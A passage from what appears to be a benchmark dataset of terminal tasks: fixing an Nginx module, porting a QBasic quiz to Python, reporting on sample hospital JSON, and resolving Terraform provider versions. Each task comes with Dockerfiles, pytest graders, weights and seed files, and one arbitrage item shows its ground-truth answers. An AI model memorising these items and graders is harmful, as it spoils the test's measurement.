\""sell_type\"": \""limit\"",\n      \""slippage\"": 0.0002\n    },\n    {\n      \""id\"": 4,\n      \""buy_exchange\"": \""binance\"",\n      \""sell_exchange\"": \""coinbase\"",\n      \""buy_amount\"": 0.1,\n      \""buy_price\"": 42000.0,\n      \""sell_price\"": 42050.0,\n      \""buy_type\"": \""market\"",\n      \""sell_type\"": \""market\""\n    },\n    {\n      \""id\"": 5,\n      \""buy_exchange\"": \""kraken\"",\n      \""sell_exchange\"": \""binance\"",\n      \""buy_amount\"": 3.0,\n      \""buy_price\"": 38000.0,\n      \""sell_price\"": 38150.0,\n      \""buy_type\"": \""limit\"",\n      \""sell_type\"": \""market\"",\n      \""slippage\"": 0.0003\n    }\n  ],\n  \""ground_truth_profits\"": [\n    -59.106,\n    -51.97,\n    -391.846,\n    -25.965,\n    -112.577\n  ]\n}""}",2025-07-21T16:49:03.639272,2025-07-22T11:57:39.698308+00:00
draft_dp_83dd8799,medium,draft_dp_83dd8799,software-engineering,"The custom Nginx module isn't compiling. Fix it so it builds correctly and adds the X-Custom-Route header with value ""custom-backend"" to all responses.",software-engineering,C|debugging|web-server,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    build-essential \
    wget \
    libpcre3-dev \
    zlib1g-dev \
    libssl-dev \
    curl \
    && apt-get clean

WORKDIR /app

RUN mkdir -p /app/custom_module
COPY ngx_http_custom_module.c /app/custom_module/
COPY config /app/custom_module/
COPY build_nginx.sh /app/
COPY nginx.conf /etc/nginx/

RUN chmod +x /app/build_nginx.sh

WORKDIR /app","import subprocess
import os
import time

def test_nginx_module_builds_and_runs():
    """"""Test that the Nginx module builds successfully and Nginx starts.""""""
    # Check if build script ran successfully
    result = subprocess.run(['bash', '/app/build_nginx.sh'], capture_output=True, text=True)
    assert result.returncode == 0, f""Build failed with error: {result.stderr}""
    
    # Check if nginx binary exists
    assert os.path.exists('/usr/sbin/nginx'), ""Nginx binary not found after build""
    
    # Start nginx
    subprocess.run(['nginx'], capture_output=True)
    time.sleep(1)
    
    # Check if nginx is running
    result = subprocess.run(['pgrep', 'nginx'], capture_output=True)
    assert result.returncode == 0, ""Nginx is not running""

def test_custom_header_added():
    """"""Test that the X-Custom-Route header is added to responses.""""""
    # Ensure nginx is running (from previous test or start it)
    subprocess.run(['nginx'], capture_output=True)
    time.sleep(1)
    
    # Make request and check headers
    result = subprocess.run(['curl', '-s', '-I', 'http://localhost:8080/'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, ""Failed to connect to nginx""
    
    # Check for the custom header
    assert 'X-Custom-Route: custom-backend' in result.stdout, \
        f""Custom header not found in response. Headers: {result.stdout}""","{""test_nginx_module_builds_and_runs"": 0.3, ""test_custom_header_added"": 0.7}","{""build_nginx.sh"": ""#!/bin/bash\nset -e\n\ncd /tmp\nwget -q http://nginx.org/download/nginx-1.24.0.tar.gz\ntar -xzf nginx-1.24.0.tar.gz\ncd nginx-1.24.0\n\n./configure --prefix=/etc/nginx \\\n    --sbin-path=/usr/sbin/nginx \\\n    --modules-path=/usr/lib/nginx/modules \\\n    --conf-path=/etc/nginx/nginx.conf \\\n    --error-log-path=/var/log/nginx/error.log \\\n    --http-log-path=/var/log/nginx/access.log \\\n    --pid-path=/var/run/nginx.pid \\\n    --lock-path=/var/run/nginx.lock \\\n    --add-module=/app/custom_module\n\nmake -j$(nproc)\nmake install"", ""config"": ""ngx_addon_name=ngx_http_custom_module\nHTTP_MODULES=\""$HTTP_MODULES ngx_http_custom_module\""\nNGX_ADDON_SRCS=\""$NGX_ADDON_SRCS $ngx_addon_dir/ngx_http_custom_module.c\"""", ""ngx_http_custom_module.c"": ""#include <ngx_config.h>\n#include <ngx_core.h>\n#include <ngx_http.h>\n\nstatic ngx_int_t ngx_http_custom_header_filter(ngx_http_request_t *r);\nstatic ngx_int_t ngx_http_custom_init(ngx_conf_t *cf);\n\nstatic ngx_http_module_t ngx_http_custom_module_ctx = {\n    NULL,                          /* preconfiguration */\n    ngx_http_custom_init,          /* postconfiguration */\n    NULL,                          /* create main configuration */\n    NULL,                          /* init main configuration */\n    NULL,                          /* create server configuration */\n    NULL,                          /* merge server configuration */\n    NULL,                          /* create location configuration */\n    NULL                           /* merge location configuration */\n};\n\nngx_module_t ngx_http_custom_module = {\n    NGX_MODULE_V1,\n    &ngx_http_custom_module_ctx,   /* module context */\n    NULL,                          /* module directives */\n    NGX_HTTP_MODULE,               /* module type */\n    NULL,                          /* init master */\n    NULL,                          /* init module */\n    NULL,                          /* init process */\n    NULL,                          /* init thread */\n    NULL,                          /* exit thread */\n    NULL,                          /* exit process */\n    NULL,                          /* exit master */\n    NGX_MODULE_V1_PADDING\n};\n\nstatic ngx_http_output_header_filter_pt ngx_http_next_header_filter;\n\nstatic ngx_int_t ngx_http_custom_header_filter(ngx_http_request_t *r) {\n    return ngx_http_next_header_filter(r);\n}\n\nstatic ngx_int_t ngx_http_custom_init(ngx_conf_t *cf) {\n    ngx_http_next_header_filter = ngx_http_top_header_filter;\n    ngx_http_top_header_filter = ngx_http_custom_header_filter;\n    \n    return NGX_OK;\n}"", ""nginx.conf"": ""worker_processes 1;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    server {\n        listen 8080;\n        server_name localhost;\n\n        location / {\n            return 200 \""OK\\n\"";\n        }\n    }\n}""}",2025-07-21T16:43:10.191424,2025-07-22T11:55:33.895344+00:00
draft_dp_575600bb,medium,draft_dp_575600bb,software-engineering,Port the QBasic quiz system at /app/src/EDUQUIZ.BAS to Python at /app/quiz.py. Preserve the exact file formats and scoring logic - the Python version must be fully compatible with the existing data files.,software-engineering,python|file-operations|compiler-migration,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Create directory structure
RUN mkdir -p /app/src /app/data

# Copy BASIC source and data creation script
COPY EDUQUIZ.BAS /app/src/
COPY create_data.py /app/

# Create the data files
RUN python3 /app/create_data.py","import os
import struct
import subprocess
import sys

def test_python_implementation_exists():
    """"""Test that the Python quiz implementation exists.""""""
    assert os.path.exists('/app/quiz.py'), ""Python implementation /app/quiz.py not found""

def test_file_format_compatibility():
    """"""Test that Python implementation maintains exact file format compatibility.""""""
    # Run a quiz session with Python implementation
    # Simulate taking a quiz with student ID 1001
    quiz_input = ""1\n1001\nTest Student\n9\n1\n2\n1\n3\n2\n1\n4\n2\n3\n1\n3\n""
    
    result = subprocess.run([sys.executable, '/app/quiz.py'], 
                          input=quiz_input, 
                          text=True, 
                          capture_output=True)
    
    assert result.returncode == 0, f""Python quiz failed to run: {result.stderr}""
    
    # Check that student record was created with correct format
    STUDENT_FORMAT = 'h30shhhh'
    STUDENT_SIZE = struct.calcsize(STUDENT_FORMAT)
    
    with open('/app/data/STUDENTS.DAT', 'rb') as f:
        data = f.read()
        assert len(data) >= STUDENT_SIZE, ""Student file too small""
        
        # Unpack first student record
        student = struct.unpack(STUDENT_FORMAT, data[:STUDENT_SIZE])
        assert student[0] == 1001, f""Student ID mismatch: expected 1001, got {student[0]}""
        assert student[1].decode('ascii').strip() == 'Test Student', ""Student name mismatch""
        assert student[2] == 9, ""Student grade mismatch""
        assert student[3] == 1, ""Total attempts should be 1""
        assert student[4] > 0, ""Total score should be greater than 0""
    
    # Check that score record was created
    SCORE_FORMAT = 'hh10sh'
    SCORE_SIZE = struct.calcsize(SCORE_FORMAT)
    
    with open('/app/data/SCORES.DAT', 'rb') as f:
        data = f.read()
        assert len(data) >= SCORE_SIZE, ""Score file should have at least one record""
        
        score = struct.unpack(SCORE_FORMAT, data[:SCORE_SIZE])
        assert score[0] == 1001, ""Score student ID should be 1001""
        assert score[1] > 0, ""Score should be greater than 0""
        assert score[3] == 10, ""Number of questions should be 10""","{""test_python_implementation_exists"": 0.3, ""test_file_format_compatibility"": 0.7}","{""EDUQUIZ.BAS"": ""REM Educational Quiz System v2.1\nREM (C) 1985 EduSoft Systems\n\nDIM SHARED StudentName AS STRING * 30\nDIM SHARED StudentID AS INTEGER\nDIM SHARED CurrentScore AS INTEGER\nDIM SHARED TotalQuestions AS INTEGER\n\nTYPE QuestionRecord\n    QText AS STRING * 200\n    Choice1 AS STRING * 50\n    Choice2 AS STRING * 50\n    Choice3 AS STRING * 50\n    Choice4 AS STRING * 50\n    Correct AS INTEGER\n    Points AS INTEGER\n    PartialCredit AS INTEGER\nEND TYPE\n\nTYPE StudentRecord\n    ID AS INTEGER\n    Name AS STRING * 30\n    Grade AS INTEGER\n    TotalAttempts AS INTEGER\n    TotalScore AS INTEGER\n    HighScore AS INTEGER\nEND TYPE\n\nTYPE ScoreRecord\n    StudentID AS INTEGER\n    Score AS INTEGER\n    QDate AS STRING * 10\n    NumQuestions AS INTEGER\nEND TYPE\n\nDIM Question AS QuestionRecord\nDIM Student AS StudentRecord\nDIM Score AS ScoreRecord\n\nCLS\nPRINT \""EDUCATIONAL QUIZ SYSTEM\""\nPRINT \""======================\""\nPRINT\n\n10 PRINT \""1. Take Quiz\""\nPRINT \""2. View Scores\""\nPRINT \""3. Exit\""\nPRINT\nINPUT \""Enter choice: \"", Choice\n\nIF Choice = 1 THEN GOTO 100\nIF Choice = 2 THEN GOTO 500\nIF Choice = 3 THEN END\nGOTO 10\n\n100 REM Take Quiz\nINPUT \""Enter Student ID: \"", StudentID\nGOSUB 1000 : REM Load Student\n\nIF Student.ID = 0 THEN\n    PRINT \""New student! Enter your name: \"";\n    INPUT StudentName\n    Student.ID = StudentID\n    Student.Name = StudentName\n    INPUT \""Enter grade level (1-12): \"", Student.Grade\n    Student.TotalAttempts = 0\n    Student.TotalScore = 0\n    Student.HighScore = 0\nEND IF\n\nPRINT \""Welcome, \""; RTRIM$(Student.Name)\nPRINT\n\nCurrentScore = 0\nTotalQuestions = 0\n\nOPEN \""/app/data/QUESTIONS.DAT\"" AS #1 LEN = LEN(Question)\nNumQuestions = LOF(1) / LEN(Question)\n\n200 REM Question Loop\nTotalQuestions = TotalQuestions + 1\nIF TotalQuestions > 10 THEN GOTO 400\n\nRecNum = INT(RND * NumQuestions) + 1\nGET #1, RecNum, Question\n\nPRINT \""Question \""; TotalQuestions; \"" (\""; Question.Points; \"" points)\""\nPRINT RTRIM$(Question.QText)\nPRINT\nPRINT \""1. \""; RTRIM$(Question.Choice1)\nPRINT \""2. \""; RTRIM$(Question.Choice2)\nPRINT \""3. \""; RTRIM$(Question.Choice3)\nPRINT \""4. \""; RTRIM$(Question.Choice4)\nPRINT\n\n210 INPUT \""Your answer (1-4): \"", Answer\nIF Answer < 1 OR Answer > 4 THEN\n    PRINT \""Invalid answer! Try again.\""\n    GOTO 210\nEND IF\n\nIF Answer = Question.Correct THEN\n    PRINT \""Correct!\""\n    CurrentScore = CurrentScore + Question.Points\nELSE\n    IF Question.PartialCredit = 1 AND ABS(Answer - Question.Correct) = 1 THEN\n        PRINT \""Close! Partial credit awarded.\""\n        CurrentScore = CurrentScore + INT(Question.Points / 2)\n    ELSE\n        PRINT \""Incorrect. The correct answer was \""; Question.Correct\n    END IF\nEND IF\n\nPRINT\nPRINT \""Press ENTER to continue...\""\nINPUT Dummy$\nCLS\nGOTO 200\n\n400 REM Quiz Complete\nCLOSE #1\n\nPRINT \""Quiz Complete!\""\nPRINT \""Your score: \""; CurrentScore\nPRINT\n\nStudent.TotalAttempts = Student.TotalAttempts + 1\nStudent.TotalScore = Student.TotalScore + CurrentScore\nIF CurrentScore > Student.HighScore THEN\n    Student.HighScore = CurrentScore\n    PRINT \""NEW HIGH SCORE!\""\nEND IF\n\nGOSUB 2000 : REM Save Student\nGOSUB 3000 : REM Save Score\n\nPRINT \""Press ENTER to return to menu...\""\nINPUT Dummy$\nCLS\nGOTO 10\n\n500 REM View Scores\nCLS\nPRINT \""LEADERBOARD\""\nPRINT \""===========\""\nPRINT\n\nOPEN \""/app/data/SCORES.DAT\"" AS #3 LEN = LEN(Score)\nNumScores = LOF(3) / LEN(Score)\n\nDIM Scores(NumScores) AS ScoreRecord\nDIM SortedIndices(NumScores) AS INTEGER\n\nFOR I = 1 TO NumScores\n    GET #3, I, Scores(I)\n    SortedIndices(I) = I\nNEXT I\n\nREM Bubble sort scores\nFOR I = 1 TO NumScores - 1\n    FOR J = I + 1 TO NumScores\n        IF Scores(SortedIndices(J)).Score > Scores(SortedIndices(I)).Score THEN\n            SWAP SortedIndices(I), SortedIndices(J)\n        END IF\n    NEXT J\nNEXT I\n\nPRINT \""Rank  ID    Score  Date\""\nPRINT \""------------------------\""\n\nCount = 0\nFOR I = 1 TO NumScores\n    IF Count >= 10 THEN EXIT FOR\n    S = Scores(SortedIndices(I))\n    IF S.Score > 0 THEN\n        Count = Count + 1\n        PRINT USING \""###   ####  ####   \\         \\\""; Count; S.StudentID; S.Score; S.QDate\n    END IF\nNEXT I\n\nCLOSE #3\n\nPRINT\nPRINT \""Press ENTER to return to menu...\""\nINPUT Dummy$\nCLS\nGOTO 10\n\n1000 REM Load Student\nOPEN \""/app/data/STUDENTS.DAT\"" AS #2 LEN = LEN(Student)\nNumStudents = LOF(2) / LEN(Student)\n\nStudent.ID = 0\nFOR I = 1 TO NumStudents\n    GET #2, I, Student\n    IF Student.ID = StudentID THEN\n        CLOSE #2\n        RETURN\n    END IF\nNEXT I\n\nCLOSE #2\nStudent.ID = 0\nRETURN\n\n2000 REM Save Student\nOPEN \""/app/data/STUDENTS.DAT\"" AS #2 LEN = LEN(Student)\nNumStudents = LOF(2) / LEN(Student)\n\nFound = 0\nFOR I = 1 TO NumStudents\n    DIM TempStudent AS StudentRecord\n    GET #2, I, TempStudent\n    IF TempStudent.ID = Student.ID THEN\n        PUT #2, I, Student\n        Found = 1\n        EXIT FOR\n    END IF\nNEXT I\n\nIF Found = 0 THEN\n    PUT #2, NumStudents + 1, Student\nEND IF\n\nCLOSE #2\nRETURN\n\n3000 REM Save Score\nScore.StudentID = StudentID\nScore.Score = CurrentScore\nScore.QDate = DATE$\nScore.NumQuestions = TotalQuestions\n\nOPEN \""/app/data/SCORES.DAT\"" AS #3 LEN = LEN(Score)\nNumScores = LOF(3) / LEN(Score)\nPUT #3, NumScores + 1, Score\nCLOSE #3\nRETURN"", ""create_data.py"": ""#!/usr/bin/env python3\nimport struct\nimport os\n\n# Create data directory\nos.makedirs('/app/data', exist_ok=True)\n\n# Question record format matching BASIC TYPE\n# QText: 200 bytes, Choice1-4: 50 bytes each, Correct: 2 bytes (INTEGER), \n# Points: 2 bytes (INTEGER), PartialCredit: 2 bytes (INTEGER)\nQUESTION_FORMAT = '200s50s50s50s50shhh'\nQUESTION_SIZE = struct.calcsize(QUESTION_FORMAT)\n\n# Student record format\n# ID: 2 bytes, Name: 30 bytes, Grade: 2 bytes, TotalAttempts: 2 bytes,\n# TotalScore: 2 bytes, HighScore: 2 bytes\nSTUDENT_FORMAT = 'h30shhhh'\nSTUDENT_SIZE = struct.calcsize(STUDENT_FORMAT)\n\n# Score record format\n# StudentID: 2 bytes, Score: 2 bytes, QDate: 10 bytes, NumQuestions: 2 bytes\nSCORE_FORMAT = 'hh10sh'\nSCORE_SIZE = struct.calcsize(SCORE_FORMAT)\n\nquestions = [\n    # Math questions\n    (\""What is 15 + 27?\"", \""42\"", \""41\"", \""43\"", \""52\"", 1, 10, 1),\n    (\""What is 8 * 7?\"", \""54\"", \""56\"", \""58\"", \""64\"", 2, 10, 0),\n    (\""What is 144 / 12?\"", \""11\"", \""12\"", \""13\"", \""14\"", 2, 15, 1),\n    (\""What is 2^3?\"", \""6\"", \""8\"", \""9\"", \""16\"", 2, 15, 0),\n    (\""Solve for x: 2x + 5 = 17\"", \""x = 6\"", \""x = 7\"", \""x = 8\"", \""x = 11\"", 1, 20, 0),\n    \n    # Science questions\n    (\""What is the chemical symbol for water?\"", \""H2O\"", \""CO2\"", \""O2\"", \""H2\"", 1, 10, 0),\n    (\""How many planets are in our solar system?\"", \""7\"", \""8\"", \""9\"", \""10\"", 2, 10, 1),\n    (\""What is the speed of light?\"", \""299,792,458 m/s\"", \""300,000,000 m/s\"", \""186,282 miles/s\"", \""Both A and C\"", 4, 20, 0),\n    (\""What is the atomic number of Carbon?\"", \""5\"", \""6\"", \""7\"", \""8\"", 2, 15, 1),\n    (\""Which is NOT a state of matter?\"", \""Solid\"", \""Liquid\"", \""Energy\"", \""Plasma\"", 3, 15, 0),\n    \n    # History questions\n    (\""In what year did Columbus reach the Americas?\"", \""1490\"", \""1491\"", \""1492\"", \""1493\"", 3, 10, 1),\n    (\""Who was the first U.S. President?\"", \""Thomas Jefferson\"", \""George Washington\"", \""John Adams\"", \""Benjamin Franklin\"", 2, 10, 0),\n    (\""When did World War II end?\"", \""1944\"", \""1945\"", \""1946\"", \""1947\"", 2, 15, 1),\n    (\""The Renaissance began in which country?\"", \""France\"", \""Germany\"", \""Italy\"", \""Spain\"", 3, 15, 0),\n    (\""Who wrote the Declaration of Independence?\"", \""George Washington\"", \""Benjamin Franklin\"", \""John Adams\"", \""Thomas Jefferson\"", 4, 20, 0)\n]\n\n# Write questions file\nwith open('/app/data/QUESTIONS.DAT', 'wb') as f:\n    for q in questions:\n        data = struct.pack(QUESTION_FORMAT,\n                          q[0].encode('ascii').ljust(200, b' '),\n                          q[1].encode('ascii').ljust(50, b' '),\n                          q[2].encode('ascii').ljust(50, b' '),\n                          q[3].encode('ascii').ljust(50, b' '),\n                          q[4].encode('ascii').ljust(50, b' '),\n                          q[5], q[6], q[7])\n        f.write(data)\n\n# Create empty student and score files\nopen('/app/data/STUDENTS.DAT', 'wb').close()\nopen('/app/data/SCORES.DAT', 'wb').close()\n\nprint(\""Data files created successfully\"")""}",2025-07-21T16:59:08.269401,2025-07-21T17:01:20.291090
draft_dp_5933fac6,extremely_hard,draft_dp_5933fac6,data-processing,"Got legacy hospital data in JSON format with nested patient records, medical history, and lab results. Need a Python system that can query patients by ID and generate CSV summary reports based on the config file.",data-processing,python|data-extraction|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Create directory structure
RUN mkdir -p /app/legacy /app/export /app/import

# Copy legacy data files
COPY legacy_data.json /app/legacy/
COPY report_config.json /app/

# Install any additional Python packages if needed
RUN pip install pandas

# Set up Python path
ENV PYTHONPATH=/app

CMD [""/bin/bash""]","import os
import json
import csv

def test_csv_patient_summary_generated():
    """"""Test that a CSV patient summary report is generated in the export directory.""""""
    # Check for CSV files in export directory
    csv_files = []
    export_dir = '/app/export'
    
    if os.path.exists(export_dir):
        for file in os.listdir(export_dir):
            if file.endswith('.csv'):
                csv_files.append(os.path.join(export_dir, file))
    
    assert len(csv_files) > 0, ""No CSV reports found in export directory""
    
    # Verify at least one CSV contains patient data
    patient_data_found = False
    for csv_file in csv_files:
        with open(csv_file, 'r') as f:
            content = f.read()
            # Check for patient IDs from the legacy data
            if '1001' in content and '1002' in content:
                patient_data_found = True
                
                # Verify CSV structure
                f.seek(0)
                reader = csv.DictReader(f)
                rows = list(reader)
                assert len(rows) >= 3, ""Not all patients included in summary""
                
                # Check that patient names are properly formatted
                names_found = any('John' in str(row.values()) and 'Smith' in str(row.values()) for row in rows)
                assert names_found, ""Patient names not properly included in report""
                break
    
    assert patient_data_found, ""No CSV file contains patient summary data""

def test_medical_history_included():
    """"""Test that medical history is included in the reports.""""""
    # Look for any generated report files
    report_found = False
    
    for root, dirs, files in os.walk('/app'):
        for file in files:
            if file.endswith(('.csv', '.json', '.txt')) and 'legacy' not in root:
                filepath = os.path.join(root, file)
                with open(filepath, 'r') as f:
                    content = f.read()
                    # Check if medical history data is present
                    if 'Hypertension' in content or 'Diabetes' in content or 'Asthma' in content:
                        report_found = True
                        break
        if report_found:
            break
    
    assert report_found, ""Medical history data not found in any generated reports""","{""test_csv_patient_summary_generated"": 0.6, ""test_medical_history_included"": 0.4}","{""legacy_data.json"": ""{\n  \""PATIENT\"": {\n    \""1001\"": {\n      \""name\"": {\n        \""first\"": \""John\"",\n        \""last\"": \""Smith\""\n      },\n      \""dob\"": \""1980-05-15\"",\n      \""gender\"": \""M\"",\n      \""contact\"": {\n        \""phone\"": \""555-0123\"",\n        \""email\"": \""john.smith@email.com\""\n      }\n    },\n    \""1002\"": {\n      \""name\"": {\n        \""first\"": \""Sarah\"",\n        \""last\"": \""Johnson\""\n      },\n      \""dob\"": \""1975-08-22\"",\n      \""gender\"": \""F\"",\n      \""contact\"": {\n        \""phone\"": \""555-0124\"",\n        \""email\"": \""sarah.j@email.com\""\n      }\n    },\n    \""1003\"": {\n      \""name\"": {\n        \""first\"": \""Michael\"",\n        \""last\"": \""Brown\""\n      },\n      \""dob\"": \""1990-12-03\"",\n      \""gender\"": \""M\"",\n      \""contact\"": {\n        \""phone\"": \""555-0125\""\n      }\n    }\n  },\n  \""MEDHIST\"": {\n    \""1001\"": {\n      \""2023-01-15\"": {\n        \""diagnosis\"": \""Hypertension\"",\n        \""physician\"": \""Dr. Wilson\""\n      },\n      \""2023-06-20\"": {\n        \""diagnosis\"": \""Type 2 Diabetes\"",\n        \""physician\"": \""Dr. Chen\""\n      }\n    },\n    \""1002\"": {\n      \""2023-03-10\"": {\n        \""diagnosis\"": \""Asthma\"",\n        \""physician\"": \""Dr. Martinez\""\n      }\n    }\n  },\n  \""LABS\"": {\n    \""1001\"": {\n      \""2023-01-15\"": {\n        \""CBC\"": {\n          \""result\"": \""Normal\"",\n          \""value\"": \""14.2\""\n        },\n        \""GLUC\"": {\n          \""result\"": \""High\"",\n          \""value\"": \""145\""\n        }\n      },\n      \""2023-06-20\"": {\n        \""HBA1C\"": {\n          \""result\"": \""High\"",\n          \""value\"": \""7.2\""\n        }\n      }\n    },\n    \""1002\"": {\n      \""2023-03-10\"": {\n        \""XRAY\"": {\n          \""result\"": \""Clear\"",\n          \""value\"": \""Normal\""\n        }\n      }\n    }\n  },\n  \""APPTS\"": {\n    \""2024-01-10\"": {\n      \""1001\"": {\n        \""time\"": \""09:00\"",\n        \""physician\"": \""Dr. Wilson\"",\n        \""type\"": \""Follow-up\""\n      },\n      \""1002\"": {\n        \""time\"": \""14:00\"",\n        \""physician\"": \""Dr. Martinez\"",\n        \""type\"": \""Checkup\""\n      }\n    },\n    \""2024-01-15\"": {\n      \""1003\"": {\n        \""time\"": \""10:30\"",\n        \""physician\"": \""Dr. Chen\"",\n        \""type\"": \""New Patient\""\n      }\n    }\n  }\n}"", ""report_config.json"": ""{\n  \""reports\"": [\n    {\n      \""name\"": \""patient_summary\"",\n      \""format\"": \""CSV\"",\n      \""fields\"": [\""patient_id\"", \""name\"", \""dob\"", \""recent_diagnosis\"", \""upcoming_appointment\""]\n    },\n    {\n      \""name\"": \""lab_results\"",\n      \""format\"": \""JSON\"",\n      \""filter\"": {\n        \""abnormal_only\"": true\n      }\n    }\n  ]\n}""}",2025-07-21T16:59:55.760596,2025-07-22T11:59:56.424671+00:00
draft_dp_b5011171,hard,draft_dp_b5011171,system-administration,"Terraform provider versions are conflicting between environments - prod needs AWS provider ~> 4.0 for compliance, dev needs ~> 5.0 for new features. Fix the module structure so all environments can run terraform plan without version conflicts.",system-administration,cloud|troubleshooting|automation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    wget \
    unzip \
    git \
    && apt-get clean

# Install Terraform
RUN wget https://releases.hashicorp.com/terraform/1.5.7/terraform_1.5.7_linux_amd64.zip && \
    unzip terraform_1.5.7_linux_amd64.zip && \
    mv terraform /usr/local/bin/ && \
    rm terraform_1.5.7_linux_amd64.zip

WORKDIR /infrastructure

# Copy the Terraform infrastructure
COPY environments/ /infrastructure/environments/
COPY modules/ /infrastructure/modules/

# Set AWS credentials to dummy values (for terraform plan to work)
ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
ENV AWS_DEFAULT_REGION=us-east-1

# Initialize git repo (some Terraform modules require git)
RUN git config --global user.email ""dev@example.com"" && \
    git config --global user.name ""Developer"" && \
    git init

WORKDIR /infrastructure","import subprocess
import os
import json

def test_all_environments_terraform_init():
    """"""Test that terraform init succeeds in all environments""""""
    environments = ['dev', 'staging', 'prod']
    
    for env in environments:
        env_path = f'/infrastructure/environments/{env}'
        
        # Run terraform init
        result = subprocess.run(
            ['terraform', 'init'],
            cwd=env_path,
            capture_output=True,
            text=True
        )
        
        assert result.returncode == 0, f""terraform init failed in {env}: {result.stderr}""
        assert os.path.exists(f'{env_path}/.terraform'), f"".terraform directory not created in {env}""
        assert os.path.exists(f'{env_path}/.terraform.lock.hcl'), f"".terraform.lock.hcl not created in {env}""

def test_terraform_plan_no_conflicts():
    """"""Test that terraform plan works without provider version conflicts""""""
    environments = ['dev', 'staging', 'prod']
    
    for env in environments:
        env_path = f'/infrastructure/environments/{env}'
        
        # Run terraform plan
        result = subprocess.run(
            ['terraform', 'plan', '-input=false'],
            cwd=env_path,
            capture_output=True,
            text=True
        )
        
        # Check that plan succeeded (exit code 0 or 2 for drift)
        assert result.returncode in [0, 2], f""terraform plan failed in {env}: {result.stderr}""
        
        # Ensure no provider version conflict errors
        assert ""version constraints"" not in result.stderr.lower(), f""Provider version conflict in {env}""
        assert ""incompatible provider version"" not in result.stderr.lower(), f""Incompatible provider version in {env}""
        assert ""does not match configured version constraint"" not in result.stderr.lower(), f""Version constraint mismatch in {env}""","{""test_all_environments_terraform_init"": 0.4, ""test_terraform_plan_no_conflicts"": 0.6}","{""environments/prod/main.tf"": ""terraform {\n  required_version = \"">= 1.0\""\n  \n  required_providers {\n    aws = {\n      source  = \""hashicorp/aws\""\n      version = \""~> 4.0\""\n    }\n    kubernetes = {\n      source  = \""hashicorp/kubernetes\""\n      version = \""~> 2.20\""\n    }\n  }\n  \n  backend \""local\"" {\n    path = \""terraform.tfstate\""\n  }\n}\n\nprovider \""aws\"" {\n  region = var.aws_region\n}\n\nmodule \""vpc\"" {\n  source = \""../../modules/vpc\""\n  \n  environment = var.environment\n  cidr_block  = var.vpc_cidr\n}\n\nmodule \""rds\"" {\n  source = \""../../modules/rds\""\n  \n  environment = var.environment\n  vpc_id      = module.vpc.vpc_id\n  subnet_ids  = module.vpc.private_subnet_ids\n}\n\nmodule \""eks\"" {\n  source = \""../../modules/eks\""\n  \n  environment = var.environment\n  vpc_id      = module.vpc.vpc_id\n  subnet_ids  = module.vpc.private_subnet_ids\n}\n\nmodule \""s3_bucket\"" {\n  source  = \""terraform-aws-modules/s3-bucket/aws\""\n  version = \""3.15.0\""\n  \n  bucket = \""${var.environment}-app-bucket\""\n}"", ""environments/prod/variables.tf"": ""variable \""environment\"" {\n  description = \""Environment name\""\n  type        = string\n  default     = \""prod\""\n}\n\nvariable \""aws_region\"" {\n  description = \""AWS region\""\n  type        = string\n  default     = \""us-east-1\""\n}\n\nvariable \""vpc_cidr\"" {\n  description = \""VPC CIDR block\""\n  type        = string\n  default     = \""10.0.0.0/16\""\n}"", ""environments/staging/main.tf"": ""terraform {\n  required_version = \"">= 1.0\""\n  \n  required_providers {\n    aws = {\n      source  = \""hashicorp/aws\""\n      version = \""~> 4.50\""\n    }\n    kubernetes = {\n      source  = \""hashicorp/kubernetes\""\n      version = \""~> 2.22\""\n    }\n  }\n  \n  backend \""local\"" {\n    path = \""terraform.tfstate\""\n  }\n}\n\nprovider \""aws\"" {\n  region = var.aws_region\n}\n\nmodule \""vpc\"" {\n  source = \""../../modules/vpc\""\n  \n  environment = var.environment\n  cidr_block  = var.vpc_cidr\n}\n\nmodule \""rds\"" {\n  source = \""../../modules/rds\""\n  \n  environment = var.environment\n  vpc_id      = module.vpc.vpc_id\n  subnet_ids  = module.vpc.private_subnet_ids\n}\n\nmodule \""eks\"" {\n  source = \""../../modules/eks\""\n  \n  environment = var.environment\n  vpc_id      = module.vpc.vpc_id\n  subnet_ids  = module.vpc.private_subnet_ids\n}\n\nmodule \""s3_bucket\"" {\n  source  = \""terraform-aws-modules/s3-bucket/aws\""\n  version = \""3.15.0\""\n  \n  bucket = \""${var.environment}-app-bucket\""\n}"", ""environments/staging/variables.tf"": ""variable \""environment\"" {\n  description = \""Environment name\""\n  type        = string\n  default     = \""staging\""\n}\n\nvariable \""aws_region\"" {\n  description = \""AWS region\""\n  type        = string\n  default     = \""us-east-1\""\n}\n\nvariable \""vpc_cidr\"" {\n  description = \""VPC CIDR block\""\n  type        = string\n  default     = \""10.2.0.0/16\""\n}"", ""environments/dev/main.tf"": ""terraform {\n  required_version = \"">= 1.0\""\n  \n  required_providers {\n    aws = {\n      source  = \""hashicorp/aws\""\n      version = \""~> 5.0\""\n    }\n    kubernetes = {\n      source  = \""hashicorp/kubernetes\""\n      version = \""~> 2.23\""\n    }\n  }\n  \n  backend \""local\"" {\n    path = \""terraform.tfstate\""\n  }\n}\n\nprovider \""aws\"" {\n  region = var.aws_region\n}\n\nmodule \""vpc\"" {\n  source = \""../../modules/vpc\""\n  \n  environment = var.environment\n  cidr_block  = var.vpc_cidr\n}\n\nmodule \""rds\"" {\n  source = \""../../modules/rds\""\n  \n  environment = var.environment\n  vpc_id      = module.vpc.vpc_id\n  subnet_ids  = module.vpc.private_subnet_ids\n}\n\nmodule \""eks\"" {\n  source = \""../../modules/eks\""\n  \n  environment = var.environment\n  vpc_id      = module.vpc.vpc_id\n  subnet_ids  = module.vpc.private_subnet_ids\n}\n\nmodule \""s3_bucket\"" {\n  source  = \""terraform-aws-modules/s3-bucket/aws\""\n  version = \""4.0.0\""\n  \n  bucket = \""${var.environment}-app-bucket\""\n}"", ""environments/dev/variables.tf"": ""variable \""environment\"" {\n  description = \""Environment name\""\n  type        = string\n  default     = \""dev\""\n}\n\nvariable \""aws_region\"" 